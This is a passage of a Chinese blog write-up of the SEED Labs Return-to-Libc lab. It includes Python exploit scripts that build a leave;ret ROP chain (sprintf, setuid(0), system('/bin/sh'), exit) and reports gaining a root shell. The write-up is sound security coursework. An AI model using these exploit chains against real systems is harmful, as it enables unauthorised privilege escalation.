+content<span class="token punctuation">[</span>W<span class="token punctuation">:</span>W<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>argv_addr<span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>byteorder<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>
+Y <span class="token operator">=</span> <span class="token number">0x1c</span>
+execv_addr <span class="token operator">=</span> <span class="token number">0xf7e916b0</span>   <span class="token comment"># The address of execv()</span>
+content<span class="token punctuation">[</span>Y<span class="token punctuation">:</span>Y<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>execv_addr<span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>byteorder<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>
+
+<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"badfile"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+  f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>经过payload覆盖后，我们的栈结构如图所示</p>
+<p><img src="/2026/05/21/seedlab-retlib/1779352176552.png" alt="ROP链"><img src="/2026/05/21/seedlab-retlib/1779352187559.png" alt="main函数中的input数组"></p>
+<p>使用该代码进行攻击，可以发现我们在dash中成功实现了root提权</p>
+<p><img src="/2026/05/21/seedlab-retlib/1779352512047.png"></p>
+<h2 id="任务五：ROP导向式编程"><a href="#任务五：ROP导向式编程" class="headerlink" title="任务五：ROP导向式编程"></a>任务五：ROP导向式编程</h2><p>在本节中，我们将使用leaveret操作构造足够的栈空间来确保ROP链的构造。首先给出攻击代码，后续再逐步分析</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span>
+<span class="token keyword">import</span> sys
+
+<span class="token keyword">def</span> <span class="token function">tobytes</span> <span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">:</span>
+	<span class="token keyword">return</span> <span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> byteorder<span class="token operator">=</span> <span class="token string">'little'</span><span class="token punctuation">)</span>
+
+content<span class="token operator">=</span><span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token number">0xaa</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span> <span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+sh_addr <span class="token operator">=</span> <span class="token number">0xffffd413</span>
+leaveret <span class="token operator">=</span> <span class="token number">0x565562ae</span>
+sprintf_addr <span class="token operator">=</span> <span class="token number">0xf7e18310</span>
+setuid_addr <span class="token operator">=</span> <span class="token number">0xf7e92070</span>
+system_addr <span class="token operator">=</span> <span class="token number">0xf7e09780</span>
+exit_addr <span class="token operator">=</span> <span class="token number">0xf7dfc0c0</span>
+ebp_bof <span class="token operator">=</span> <span class="token number">0xffffcd98</span>
+foo_addr<span class="token operator">=</span><span class="token number">0x565562b0</span>
+
+<span class="token comment">## setuid()'s 1st argument</span>
+sprintf_arg1 <span class="token operator">=</span> ebp_bof <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">+</span> <span class="token number">5</span><span class="token operator">*</span><span class="token number">0x20</span>
+
+<span class="token comment">## a byte that contains 0x00</span>
+sprintf_arg2 <span class="token operator">=</span> sh_addr <span class="token operator">+</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span>
+
+<span class="token comment">## Use leaveret to return to the first sprintf()</span>
+ebp_next <span class="token operator">=</span> ebp_bof <span class="token operator">+</span> <span class="token number">0x20</span>
+content <span class="token operator">+=</span> tobytes<span class="token punctuation">(</span>ebp_next<span class="token punctuation">)</span>
+content <span class="token operator">+=</span> tobytes<span class="token punctuation">(</span>leaveret<span class="token punctuation">)</span>
+content <span class="token operator">+=</span> <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x20</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span>
+
+<span class="token comment">## sprintf(sprintf_argl, sprintf_arg2)</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    ebp_next <span class="token operator">+=</span> <span class="token number">0x20</span>
+    content <span class="token operator">+=</span> tobytes<span class="token punctuation">(</span>ebp_next<span class="token punctuation">)</span>
+    content <span class="token operator">+=</span> tobytes<span class="token punctuation">(</span>sprintf_addr<span class="token punctuation">)</span>
+    content <span class="token operator">+=</span> tobytes<span class="token punctuation">(</span>leaveret<span class="token punctuation">)</span>
+    content <span class="token operator">+=</span> tobytes<span class="token punctuation">(</span>sprintf_arg1<span class="token punctuation">)</span>
+    content <span class="token operator">+=</span> tobytes<span class="token punctuation">(</span>sprintf_arg2<span class="token punctuation">)</span>
+    content <span class="token operator">+=</span> <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x20</span> <span class="token operator">-</span> <span class="token number">5</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span>
+    sprintf_arg1 <span class="token operator">+=</span> <span class="token number">1</span>
+
+<span class="token comment">## setuid(0)</span>
+ebp_next <span class="token operator">+=</span> <span class="token number">0x20</span>
+content <span class="token operator">+=</span> tobytes<span class="token punctuation">(</span>ebp_next<span class="token punctuation">)</span>
+content <span class="token operator">+=</span> tobytes<span class="token punctuation">(</span>setuid_addr<span class="token punctuation">)</span>
+content <span class="token operator">+=</span> tobytes<span class="token punctuation">(</span>leaveret<span class="token punctuation">)</span>
+content <span class="token operator">+=</span> tobytes<span class="token punctuation">(</span><span class="token number">0xFFFFFFFF</span><span class="token punctuation">)</span>
+content <span class="token operator">+=</span> <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x20</span> <span class="token operator">-</span> <span class="token number">4</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span>
+
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    ebp_next <span class="token operator">+=</span> <span class="token number">0x20</span>
+    content <span class="token operator">+=</span> tobytes<span class="token punctuation">(</span>ebp_next<span class="token punctuation">)</span>
+    content <span class="token operator">+=</span> tobytes<span class="token punctuation">(</span>foo_addr<span class="token punctuation">)</span>
+    content <span class="token operator">+=</span> tobytes<span class="token punctuation">(</span>leaveret<span class="token punctuation">)</span>
+    content <span class="token operator">+=</span> <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x20</span> <span class="token operator">-</span> <span class="token number">3</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span>
+
+
+
+<span class="token comment">## system("/bin/sh")</span>
+ebp_next <span class="token operator">+=</span> <span class="token number">0x20</span>
+content <span class="token operator">+=</span> tobytes<span class="token punctuation">(</span>ebp_next<span class="token punctuation">)</span>
+content <span class="token operator">+=</span> tobytes<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>
+content <span class="token operator">+=</span> tobytes<span class="token punctuation">(</span>leaveret<span class="token punctuation">)</span>
+content <span class="token operator">+=</span> tobytes<span class="token punctuation">(</span>sh_addr<span class="token punctuation">)</span>
+content <span class="token operator">+=</span> <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x20</span> <span class="token operator">-</span> <span class="token number">4</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span>
+
+<span class="token comment">## exit()</span>
+content <span class="token operator">+=</span> tobytes<span class="token punctuation">(</span><span class="token number">0xFFFFFFFF</span><span class="token punctuation">)</span>
+content <span class="token operator">+=</span> tobytes<span class="token punctuation">(</span>exit_addr<span class="token punctuation">)</span>
+
+<span class="token comment">## Write the content to a file</span>
+<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"badfile"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+    f<span class="token punctuation">.</span>write <span class="token punctuation">(</span>content<span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>首先我们来确定要使用到的函数，setuid用于更新权限，sprintf用于修改setuid参数值，system用于获取shell，exit用于函数返回，foo用于满足实验任务，leaveret用于扩展栈空间</p>
+<p>使用gdb分别获取这些函数的地址以及leaveret的地址</p>
+<p><img src="/2026/05/21/seedlab-retlib/1779356020869.png" alt="函数地址"></p>
+<p><img src="/2026/05/21/seedlab-retlib/1779356078621.png" alt="bof中的leaveret"></p>
+<p>确定完地址以后，我们来分析sprintf的两个参数。首先，由于strcpy无法直接绕过0截断，我们可以先将setuid的参数设为0xffffffff。然后计算好偏移，比如 <code>sprintf_arg1=ebp_bof + 12 + 5*0x20</code>，此处对应着程序中setuid的参数部分，后续 <code>sprintf_arg2 = sh_addr + len(&quot;/bin/sh&quot;)</code>这里则取到了字符串末尾的’\0’用于字节填充，将4bit的setuid参数动态修改为0。</p>
+<p>为了确保ROP链的成立，我们使用了leaveret栈迁移技术。首先明确 <code>leave=&quot;mov esp,ebp;pop ebp&quot; ret=&quot;pop eip&quot;</code>。</p>
+<p>执行leave操作时首先使esp同样指向栈上的旧ebp处，然后esp+4，pop ebp到父ebp处。ret则是转移控制流到esp+8的地址处</p>
+<p>根据以上原理，我们可以对以下代码片段进行解释：首先修改下一步ebp为ebp+0x20处，开拓0x20bit空间，执行完原有的leaveret后，迁移完ebp后，再次执行leaveret，使esp指向当前ebp处，然后pop ebp，继续迁移ebp开拓0x20空间，此时retaddr则为sprintf_addr，执行完以后再次leaveret，继续开拓新栈帧。重复上述操作，即可无限制延长ROP链。</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">## Use leaveret to return to the first sprintf()</span>
+ebp_next <span class="token operator">=</span> ebp_bof <span class="token operator">+</span> <span class="token number">0x20</span>
+content <span class="token operator">+=</span> tobytes<span class="token punctuation">(</span>ebp_next<span class="token punctuation">)</span>
+content <span class="token operator">+=</span> tobytes<span class="token punctuation">(</span>leaveret<span class="token punctuation">)</span>
+content <span class="token operator">+=</span> <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x20</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span>
+
+<span class="token comment">## sprintf(sprintf_argl, sprintf_arg2)</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    ebp_next <span class="token operator">+=</span> <span class="token number">0x20</span>
+    content <span class="token operator">+=</span> tobytes<span class="token punctuation">(</span>ebp_next<span class="token punctuation">)</span>
+    content <span class="token operator">+=</span> tobytes<span class="token punctuation">(</span>sprintf_addr<span class="token punctuation">)</span>
+    content <span class="token operator">+=</span> tobytes<span class="token punctuation">(</span>leaveret<span class="token punctuation">)</span>
+    content <span class="token operator">+=</span> tobytes<span class="token punctuation">(</span>sprintf_arg1<span class="token punctuation">)</span>
+    content <span class="token operator">+=</span> tobytes<span class="token punctuation">(</span>sprintf_arg2<span class="token punctuation">)</span>
+    content <span class="token operator">+=</span> <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x20</span> <span class="token operator">-</span> <span class="token number">5</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span>
+    sprintf_arg1 <span class="token operator">+=</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>后续的函数执行也同理，直到exit，此时已经是最后一个函数，无需再开拓栈空间，因此没有续接leaveret。并且第一行将ebp转到0xffffffff，无实际意义。</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">## exit()</span>
+content <span class="token operator">+=</span> tobytes<span class="token punctuation">(</span><span class="token number">0xFFFFFFFF</span><span class="token punctuation">)</span>
+content <span class="token operator">+=</span> tobytes<span class="token punctuation">(</span>exit_addr<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>执行攻击，得到结果如下，成功取得root权限</p>
+<p><img src="/2026/05/21/seedlab-retlib/1779357663381.png"></p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">Yssx</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://Yssx-g.github.io/2026/05/21/seedlab-retlib/">https://Yssx-g.github.io/2026/05/21/seedlab-retlib/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">Yssx</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/SEED-LAB/">
+                                    <span class="chip bg-color">SEED_LAB</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+        <style>
+    .valine-card {
+        margin: 1.5rem auto;
+    }
+
+    .valine-card .card-content {
+        padding: 20px 20px 5px 20px;
+    }
+
+    #vcomments textarea {
+        box-sizing: border-box;
+        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
+    }
+
+    #vcomments p {
+        margin: 2px 2px 10px;
+        font-size: 1.05rem;
+        line-height: 1.78rem;
+    }
+
+    #vcomments blockquote p {
+        text-indent: 0.2rem;
+    }
+
+    #vcomments a {
+        padding: 0 2px;
+        color: #4cbf30;
+        font-weight: 500;
+        text-decoration: none;
+    }
+
+    #vcomments img {
+        max-width: 100%;
+        height: auto;
+        cursor: pointer;
+    }
+
+    #vcomments ol li {
+        list-style-type: decimal;
+    }
+
+    #vcomments ol,
+    ul {
+        display: block;
+        padding-left: 2em;
+        word-spacing: 0.05rem;
+    }
+
+    #vcomments ul li,
+    ol li {
+        display: list-item;
+        line-height: 1.8rem;
+        font-size: 1rem;
+    }
+
+    #vcomments ul li {
+        list-style-type: disc;
+    }
+
+    #vcomments ul ul li {
+        list-style-type: circle;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    #vcomments table, th, td {
+        border: 0;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments h1 {
+        font-size: 1.85rem;
+        font-weight: bold;
+        line-height: 2.2rem;
+    }
+
+    #vcomments h2 {
+        font-size: 1.65rem;
+        font-weight: bold;
+        line-height: 1.9rem;
+    }
+
+    #vcomments h3 {
+        font-size: 1.45rem;
+        font-weight: bold;
+        line-height: 1.7rem;
+    }
+
+    #vcomments h4 {
+        font-size: 1.25rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    #vcomments h5 {
+        font-size: 1.1rem;
+        font-weight: bold;
+        line-height: 1.4rem;
+    }
+
+    #vcomments h6 {
+        font-size: 1rem;
+        line-height: 1.3rem;
+    }
+
+    #vcomments p {
+        font-size: 1rem;
+        line-height: 1.5rem;
+    }
+
+    #vcomments hr {
+        margin: 12px 0;
+        border: 0;
+        border-top: 1px solid #ccc;
+    }
+
+    #vcomments blockquote {
+        margin: 15px 0;
+        border-left: 5px solid #42b983;
+        padding: 1rem 0.8rem 0.3rem 0.8rem;
+        color: #666;
+        background-color: rgba(66, 185, 131, .1);
+    }
+
+    #vcomments pre {
+        font-family: monospace, monospace;
+        padding: 1.2em;
+        margin: .5em 0;
+        background: #272822;
+        overflow: auto;
+        border-radius: 0.3em;
+        tab-size: 4;
+    }
+
+    #vcomments code {
+        font-family: monospace, monospace;
+        padding: 1px 3px;
+        font-size: 0.92rem;
+        color: #e96900;
+        background-color: #f8f8f8;
+        border-radius: 2px;
+    }
+
+    #vcomments pre code {
+        font-family: monospace, monospace;
+        padding: 0;
+        color: #e8eaf6;
+        background-color: #272822;
+    }
+
+    #vcomments pre[class*="language-"] {
+        padding: 1.2em;
+        margin: .5em 0;
+    }
+
+    #vcomments code[class*="language-"],
+    pre[class*="language-"] {
+        color: #e8eaf6;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+
+    #vcomments b,
+    strong {
+        font-weight: bold;
+    }
+
+    #vcomments dfn {
+        font-style: italic;
+    }
+
+    #vcomments small {
+        font-size: 85%;
+    }
+
+    #vcomments cite {
+        font-style: normal;
+    }
+
+    #vcomments mark {
+        background-color: #fcf8e3;
+        padding: .2em;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+</style>
+
+<div class="card valine-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="vcomments" class="card-content" style="display: grid">
+    </div>
+</div>
+
+<script src="/libs/valine/av-min.js"></script>
+<script src="/libs/valine/Valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        appId: 'SiTo63aMVHKbeTEWaaDA7yKT-gzGzoHsz',
+        appKey: 'gtZzENvb4A18gTdqF2Koeky7',
+        notify: 'false' === 'true',
+        verify: 'false' === 'true',
+        visitor: 'true' === 'true',
+        avatar: 'mm',
+        pageSize: '10',
+        lang: 'zh-cn',
+        placeholder: 'gogogo'
+    });
+</script>
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2026/05/21/seedlab-retlib/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="SEEDLAB_RETLIB">
+                        
+                        <span class="card-title">SEEDLAB_RETLIB</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            SeedLab实验（本节实验网址https://seedsecuritylabs.org/chinese/labs/Software/Return_to_Libc/）
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2026-05-21
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8/" class="post-category">
+                                    软件安全
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/SEED-LAB/">
+                        <span class="chip bg-color">SEED_LAB</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2026/05/19/seedlab-buffer-overflow/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="SEEDLAB-BUFFER_OVERFLOW">
+                        
+                        <span class="card-title">SEEDLAB-BUFFER_OVERFLOW</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            SeedLab实验（本节实验网址https://seedsecuritylabs.org/chinese/labs/Software/Buffer_Overflow_Server/）
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2026-05-19
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8/" class="post-category">
+                                    软件安全
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/SEED-LAB/">
+                        <span class="chip bg-color">SEED_LAB</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="2821652960"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+
+    
+    <div class="container row center-align" style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2025-2026</span>
+            
+            <span id="year">2025</span>
+            <a href="/about" target="_blank">Yssx</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <br>
+            
+
+            
+                <script src='https://unpkg.com/mermaid/dist/mermaid.min.js'></script>
+                <script>
+                  if (window.mermaid) {
+                    mermaid.initialize({theme: 'forest'});
+                  }
+                </script>
+              
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/Yssx-g" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+
+
+
+
+
+
